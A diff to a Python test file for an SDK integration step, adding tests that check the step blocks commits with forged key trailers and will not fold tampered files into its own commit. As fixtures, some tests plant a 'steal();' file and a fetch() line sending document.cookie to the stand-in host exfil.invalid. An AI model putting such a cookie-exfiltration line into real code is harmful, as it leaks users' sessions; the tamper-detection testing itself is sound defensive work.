@@ -373,7 +373,10 @@ class SdkCase(unittest.TestCase):
         artifacts = {"game_design": self.design, "scaffold_record": self.scaffold}
         artifacts.update(inputs)
         self.runner = runner
-        return step.execute(FakeInputs(**artifacts), FakeContext(sdk))
+        context = FakeContext(sdk)
+        # Where the step keeps its ledger of the commits it made: outside the checkout.
+        context.run_dir = os.path.join(self.scratch, "run")
+        return step.execute(FakeInputs(**artifacts), context)
 
     def report(self, result):
         self.assertEqual(len(result.artifacts), 1)
@@ -831,6 +834,53 @@ class Commits(SdkCase):
         self.assertEqual(self.head(), base)
         self.assertEqual(self.report(result)["build_ref"],
                          {"commit_sha": base, "base_commit_sha": base, "sdk_commits": []})
+
+    def test_a_commit_forging_its_trailer_is_not_taken_for_its_own(self):
+        make_repo(self.repo)
+        base = self.head()
+        write(self.repo, "src/game/evil.ts", "steal();\n")
+        git(self.repo, "add", "-A")
+        git(self.repo, "commit", "-qm", "chore: harmless\n\nWgf-Sdk-Key: local:sdk:1")
+        result = self.execute(prototype_report=prototype_at(base))
+        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
+        self.assertIn("commit-lineage-mismatch", result.message)
+
+    def test_a_forged_commit_with_this_visits_key_is_not_reused(self):
+        make_repo(self.repo)
+        write(self.repo, "src/game/evil.ts", "steal();\n")
+        git(self.repo, "add", "-A")
+        git(self.repo, "commit", "-qm", "chore: harmless\n\nWgf-Sdk-Key: local:sdk:1")
+        # As the base itself (no prototype-report): the keyed-commit lookup finds a commit
+        # carrying this visit's key, which the ledger does not know. It is not taken for
+        # the integration's commit; nothing is committed.
+        head = self.head()
+        result = self.execute()
+        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
+        self.assertIn("forged", result.message)
+        self.assertEqual(self.head(), head)
+
+    def test_a_hand_edit_to_an_integration_file_is_not_folded_into_its_commit(self):
+        make_repo(self.repo)
+        base = self.head()
+        with open(os.path.join(self.repo, "src", "main.ts"), "a") as handle:
+            handle.write("fetch('https://exfil.invalid/?' + document.cookie);\n")
+        result = self.execute(prototype_report=prototype_at(base), commit_first=False)
+        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
+        self.assertIn("src/main.ts", result.message)
+        self.assertEqual(self.head(), base)
+
+    def test_an_interrupted_attempt_s_leftovers_are_regenerated_not_kept(self):
+        make_repo(self.repo)
+        base = self.head()
+        first = self.execute(FakeRunner(failing_scenarios={"reward-callback"}),
+                             prototype_report=prototype_at(base))
+        self.assertEqual(first.outcome, StepOutcome.FAILED)  # left uncommitted, started
+        with open(os.path.join(self.repo, "src", "main.ts"), "a") as handle:
+            handle.write("fetch('https://exfil.invalid/');\n")
+        again = self.execute(prototype_report=prototype_at(base), commit_first=False)
+        self.assertEqual(again.outcome, StepOutcome.SUCCESS, again.error or again.message)
+        self.assertNotIn("exfil", git(self.repo, "show", "HEAD:src/main.ts").stdout)
+        self.assertEqual(git(self.repo, "status", "--porcelain").stdout, "")
 
     def test_nothing_is_pushed(self):
         make_repo(self.repo)
